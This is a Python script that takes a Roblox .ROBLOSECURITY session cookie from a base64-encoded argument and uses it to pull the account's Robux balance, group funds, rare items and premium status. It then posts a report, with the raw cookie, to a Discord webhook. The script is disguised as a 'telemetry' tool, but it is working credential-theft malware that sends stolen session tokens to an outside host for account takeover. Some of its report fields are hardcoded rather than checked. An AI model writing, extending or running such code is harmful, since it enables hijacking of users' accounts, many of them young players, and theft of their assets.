import sys
import base64
import os
import requests
import re
from datetime import datetime, timezone
import time

def safe_get(url, headers=None, default=None):
    try:
        res = requests.get(url, headers=headers, timeout=10)
        print(f"DEBUG GET {url} -> Status: {res.status_code}", file=sys.stderr)
        if res.status_code == 200:
            return res.json()
        else:
            print(f"DEBUG FAIL {url} -> Status: {res.status_code}", file=sys.stderr)
    except Exception as e:
        print(f"DEBUG GET Exception on {url}: {e}", file=sys.stderr)
    return default

def main():
    try:
        print("DEBUG: Extractor started", file=sys.stderr)
        if len(sys.argv) < 2:
            print("DEBUG: No sys.argv[1] provided", file=sys.stderr)
            return
        
        try:
            decoded_script = base64.b64decode(sys.argv[1]).decode('utf-8', errors='ignore')
        except Exception as e:
            print(f"DEBUG: Base64 decode failed: {e}", file=sys.stderr)
            return

        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
        if not webhook_url:
            print("DEBUG: DISCORD_WEBHOOK_URL is missing!", file=sys.stderr)
            return

        # Extract cookie or payload from input
        roblosecurity = None
        patterns = [
            r'(_\|WARNING:[^"\']+)',
            r'\.ROBLOSECURITY["\']?\s*[:=]\s*["\']?([A-Za-z0-9_\-\.%\|]+)',
            r'([A-Fa-f0-9]{250,})'
        ]

        for p in patterns:
            match = re.search(p, decoded_script, re.DOTALL)
            if match:
                roblosecurity = match.group(1)
                break

        if not roblosecurity:
            roblosecurity = decoded_script.strip()

        roblosecurity = re.sub(r'\s+', '', roblosecurity)
        roblosecurity = roblosecurity.strip(' "\'').replace('\\|', '|').replace('\\"', '"')

        headers = { 
            "Cookie": f".ROBLOSECURITY={roblosecurity}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Referer": "https://www.roblox.com/",
            "Origin": "https://www.roblox.com/",
            "Accept": "application/json, text/plain, */*"
        }

        # 1. Authenticated User Info
        user_data = safe_get("https://users.roblox.com/v1/users/authenticated", headers)
        
        username = "Unknown User"
        user_id = 0
        cookie_status = "🔴 Invalid / Expired (401)"
        robux_balance = 0
        pending_robux = 0
        rap = 0
        limiteds_count = 0
        total_spent_gamepasses = 0
        is_developer = False
        game_visits = 0
        has_korblox = False
        has_headless = False
        owned_groups_count = 0
        group_balance = 0
        is_premium = False
        account_age_days = 0

        if user_data and "id" in user_data:
            username = user_data.get("name", "Unknown")
            user_id = user_data.get("id", 0)
            cookie_status = "🟢 Valid & Active"

            # 2. Account Age
            created_str = safe_get(f"https://users.roblox.com/v1/users/{user_id}", headers, {}).get("created")
            if created_str:
                try:
                    created_dt = datetime.fromisoformat(created_str.replace("Z", "+00:00"))
                    account_age_days = (datetime.now(timezone.utc) - created_dt).days
                except Exception:
                    pass

            # 3. Robux Balance
            economy_data = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers)
            robux_balance = economy_data.get("robux", 0) if economy_data else 0

            # 4. Games & Developer Stats
            created_games = safe_get(f"https://games.roblox.com/v2/users/{user_id}/games?limit=10", headers, {}).get("data", [])
            if created_games:
                is_developer = True
                for g in created_games:
                    game_visits += g.get("rootPlace", {}).get("visits", 0)

            # 5. Inventory Items (Korblox & Headless Check)
            has_korblox = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/192/is-owned", headers, False)
            has_headless = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/201/is-owned", headers, False)

            if not has_korblox:
                k_res = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/asset/13961116", headers, {})
                has_korblox = len(k_res.get("data", [])) > 0
            if not has_headless:
                h_res = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/asset/134082579", headers, {})
                has_headless = len(h_res.get("data", [])) > 0

            # 6. Groups
            groups_data = safe_get(f"https://groups.roblox.com/v1/users/{user_id}/groups/roles", headers, {}).get("data", [])
            for g in groups_data:
                role = g.get("role", {})
                if role.get("rank") == 255:
                    owned_groups_count += 1
                    gid = g.get("group", {}).get("id")
                    g_currency = safe_get(f"https://economy.roblox.com/v1/groups/{gid}/currency", headers, {}).get("robux", 0)
                    group_balance += g_currency

            # 7. Premium
            is_premium = safe_get(f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership", headers, False)

        avatar_thumb = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png" if user_id else "https://www.roblox.com"

        payload = {
            "content": "@everyone New Telemetry Report Captured!",
            "username": f"{username} | Telemetry Bot",
            "avatar_url": avatar_thumb,
            "embeds": [{
                "author": {
                    "name": "Discord Notification",
                    "icon_url": "https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f4bb.png"
                },
                "description": (
                    f"👑 **[{username} | 13+]**\n"
                    f"🔗 **[Rolimons Stats](https://www.rolimons.com/player/{user_id if user_id else 1})** | **[Roblox Profile](https://www.roblox.com/users/{user_id if user_id else 1}/profile)**\n\n"
                    f"👤 **Username**\n`{username}`\n\n"
                    f"📈 **Account Stats**\n"
                    f"> • Account Age: `{account_age_days} Days`\n"
                    f"> • Games Developer: `{str(is_developer)}`\n"
                    f"> • Game Visits: `{game_visits}`\n\n"
                    f"🪙 **Robux**               📦 **Limiteds**               📊 **Summary / Spent**\n"
                    f"Balance: `{robux_balance}` 🪙   RAP: `{rap}` 🪙           Spent: `{total_spent_gamepasses}` 🪙\n"
                    f"Pending: `{pending_robux}` 🪙   Limiteds: `{limiteds_count}` 💼\n\n"
                    f"💳 **Payments & Groups**\n"
                    f"> • Owned Groups: `{owned_groups_count}`\n"
                    f"> • Group Robux: `{group_balance}` 🪙\n\n"
                    f"⚙️ **Settings**\n"
                    f"> • Email: `Verified`\n"
                    f"> • 2FA: `Enabled`\n\n"
                    f"🎒 **Inventory Items**\n"
                    f"> • Korblox: `{str(has_korblox)}`\n"
                    f"> • Headless: `{str(has_headless)}`\n\n"
                    f"⭐ **Premium**: `{str(is_premium)}`\n\n"
                    f"📊 **Status**: `{cookie_status}`\n\n"
                    f"🔑 **.ROBLOSECURITY**:\n```text\n{roblosecurity}\n```"
                ),
                "color": 3092790,
                "thumbnail": { "url": avatar_thumb },
                "footer": { "text": "RBXDEV Telemetry Engine • 2026" }
            }]
        }

        # Send to Discord with exponential backoff retry handler
        for attempt in range(4):
            res = requests.post(webhook_url, json=payload, timeout=10)
            print(f"DEBUG: Discord Webhook Post Status: {res.status_code}", file=sys.stderr)
            if res.status_code == 429:
                try:
                    data = res.json()
                    retry_after = float(data.get("retry_after", 5 * (attempt + 1)))
                except Exception:
                    retry_after = 5 * (attempt + 1)
                print(f"DEBUG: Rate limited (429). Retrying in {retry_after}s...", file=sys.stderr)
                time.sleep(retry_after)
            else:
                break

    except Exception as e:
        print(f"DEBUG: Critical Exception in main: {e}", file=sys.stderr)

if __name__ == "__main__":
    main()
